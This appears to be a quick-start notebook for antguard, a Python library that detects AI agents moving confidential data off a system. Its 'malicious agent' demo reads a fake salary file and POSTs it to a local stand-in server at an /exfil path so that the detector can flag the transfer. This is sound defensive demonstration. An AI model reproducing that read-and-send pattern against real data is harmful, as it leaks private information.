# antguard - Quick Start

**Guard. Detect. Protect.**

Pure system-level profiler for AI data privacy.
Like `cProfile`, but for data movement.

No AI. No API. No cloud. No regex.

Part of the **Ant Intelligence Ecosystem** by [VK-Ant](https://github.com/VK-Ant)

| | |
|---|---|
| **PyPI** | `pip install antguard` |
| **GitHub** | [github.com/VK-Ant/antguard](https://github.com/VK-Ant/antguard) |
| **License** | MIT |

## 1. Install

In [ ]:
!pip install antguard -q

In [ ]:
import antguard
print(f"antguard v{antguard.__version__} installed")
print(f"Tagline: {antguard.__tagline__}")

## 2. Create Confidential Test Data

In [ ]:
import os

os.makedirs("demo_data/confidential", exist_ok=True)
os.makedirs("demo_data/output", exist_ok=True)

# fake employee salary data
with open("demo_data/confidential/salary.csv", "w") as f:
    f.write("""CONFIDENTIAL - Ant Technologies
Employee Salary Report 2026

ID,Name,Role,Salary,Aadhaar
E001,Ravi Kumar,Engineer,2500000,1234-5678-9012
E002,Priya Shah,Manager,3200000,9876-5432-1098
E003,Amit Patel,Director,4500000,5555-6666-7777
""")

# fake API keys
with open("demo_data/confidential/api_keys.env", "w") as f:
    f.write("""OPENAI_API_KEY=sk-proj-EXAMPLE12345
AWS_SECRET_KEY=wJalrXUtnFEMI/EXAMPLE
DB_PASSWORD=super_secret_123
""")

print("Confidential files created:")
for f in os.listdir("demo_data/confidential"):
    size = os.path.getsize(f"demo_data/confidential/{f}")
    print(f"  {f} ({size} bytes)")

## 3. Demo A: Safe Agent (No Data Leaves)

In [ ]:
import time
from antguard import Guard

with Guard(
    watch=["demo_data/confidential"],
    runtime=True,
    gpu=False,
    log_path="demo_data/logs_safe",
) as g:
    # simulate safe agent behavior
    print("[Agent] Reading salary data...")
    with open("demo_data/confidential/salary.csv", "r") as f:
        data = f.read()
    time.sleep(1)

    print("[Agent] Creating local summary...")
    summary = f"Employee count: {data.count('E00')}\n"
    with open("demo_data/output/summary.txt", "w") as f:
        f.write(summary)
    time.sleep(1)

    print("[Agent] Done.")

print(f"\nData left system: {g.did_data_leave()}")
print(f"Risk level: {g.risk_level().value}")
print(f"File events: {len(g.file_events())}")
print(f"Network events: {len(g.net_events())}")

## 4. Demo B: Malicious Agent (Data Exfiltration)

In [ ]:
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

# start a fake external server
class QuietHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        self.rfile.read(length)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'ok')
    def log_message(self, *args): pass

server = HTTPServer(('127.0.0.1', 18082), QuietHandler)
threading.Thread(target=server.serve_forever, daemon=True).start()
print("Fake external server running on 127.0.0.1:18082")

In [ ]:
import urllib.request

with Guard(
    watch=["demo_data/confidential"],
    runtime=True,
    gpu=False,
    log_path="demo_data/logs_malicious",
) as g:
    # step 1: read confidential data
    print("[Agent] Reading salary data...")
    with open("demo_data/confidential/salary.csv", "r") as f:
        stolen_data = f.read()
    time.sleep(1)

    # step 2: send to external server
    print("[Agent] Sending data to external server...")
    try:
        req = urllib.request.Request(
            "http://127.0.0.1:18082/exfil",
            data=stolen_data.encode(),
            method="POST",
        )
        urllib.request.urlopen(req, timeout=5)
        print("[Agent] Data sent!")
    except Exception as e:
        print(f"[Agent] Send attempted ({e})")
    time.sleep(2)

    print("[Agent] Done.")

print(f"\nDATA LEFT SYSTEM: {g.did_data_leave()}")
print(f"RISK LEVEL: {g.risk_level().value}")
print(f"Network events: {len(g.net_events())}")
print(f"Correlations: {len(g.correlations())}")

if g.net_events():
    print("\nNetwork Events:")
    for ev in g.net_events():
        print(f"  {ev.destination}:{ev.port} sent={ev.bytes_sent} risk={ev.risk.value}")

## 5. View Full Audit Report

In [ ]:
# save and display the report
paths = g.save("demo_data/logs_malicious")

print("FULL AUDIT REPORT")
print("=" * 50)
with open(paths["txt"]) as f:
    print(f.read())

## 6. View JSON Report

In [ ]:
import json

with open(paths["json"]) as f:
    report = json.load(f)

print(f"Session: {report['session_id']}")
print(f"Data left: {report['data_left_system']}")
print(f"Risk: {report['overall_risk']}")
print(f"\nSummary:")
print(json.dumps(report["summary"], indent=2))

## 7. Runtime Metrics

In [ ]:
metrics = g.runtime_metrics()
if metrics:
    print(f"Duration: {metrics.duration_sec:.1f}s")
    print(f"CPU avg/peak: {metrics.cpu_avg:.1f}% / {metrics.cpu_peak:.1f}%")
    print(f"Memory peak: {metrics.memory_peak_bytes / (1024**3):.2f} GB")
    print(f"Process RSS peak: {metrics.process_rss_peak / (1024**2):.1f} MB")
    print(f"Samples: {metrics.snapshot_count}")
    if metrics.anomalies:
        print(f"\nAnomalies:")
        for a in metrics.anomalies:
            print(f"  {a}")

## 8. File Fingerprints

In [ ]:
fps = g.fingerprints()
print(f"Fingerprinted files: {len(fps)}")
for path, info in fps.items():
    name = os.path.basename(path)
    print(f"  {name}: sha256:{info['hash'][:32]}... ({info['size']} bytes, {len(info['chunks'])} chunks)")

## 9. Data Flow Map

In [ ]:
dfm = g.data_flow_map()
print("Data Flow Map:")
print(f"  Files accessed: {len(dfm['files_accessed'])}")
for path in dfm['files_accessed']:
    print(f"    {os.path.basename(path)}")
print(f"  Outbound: {len(dfm['outbound'])}")
for out in dfm['outbound']:
    print(f"    -> {out['destination']} ({out['bytes_sent']} bytes)")
print(f"  Data left: {dfm['data_left']}")

## 10. Wrap Your Own Code

Replace the fake agent with your real code. antguard doesn't care what runs inside.

```python
from antguard import Guard

with Guard(watch=["./my_data/"]) as g:
    # YOUR code here - SightRAG, docqwise, LangChain, anything
    my_agent.process("confidential.pdf")

print(g.did_data_leave())
g.save("./logs/")
```

In [ ]:
# cleanup
server.shutdown()
print("Demo complete. antguard - Guard. Detect. Protect.")